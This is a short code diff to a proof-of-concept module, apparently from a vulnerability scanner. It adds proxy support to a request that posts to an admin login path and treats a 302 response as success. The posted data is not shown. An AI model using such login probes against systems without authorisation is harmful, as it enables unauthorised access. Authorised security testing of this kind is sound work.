@@ -2,6 +2,8 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -27,7 +29,7 @@ def poc(target):
     }
 
     try:
-        r = requests.post(target + "/admin/index.php?c=session&a=login", headers=headers, data=data, verify=False, timeout=5,allow_redirects=False)
+        r = requests.post(target + "/admin/index.php?c=session&a=login", headers=headers, data=data, verify=False, timeout=5,allow_redirects=False,proxies=proxies)
         if r.status_code==302:
             result['target'] = target
             result['poc'] = NAME
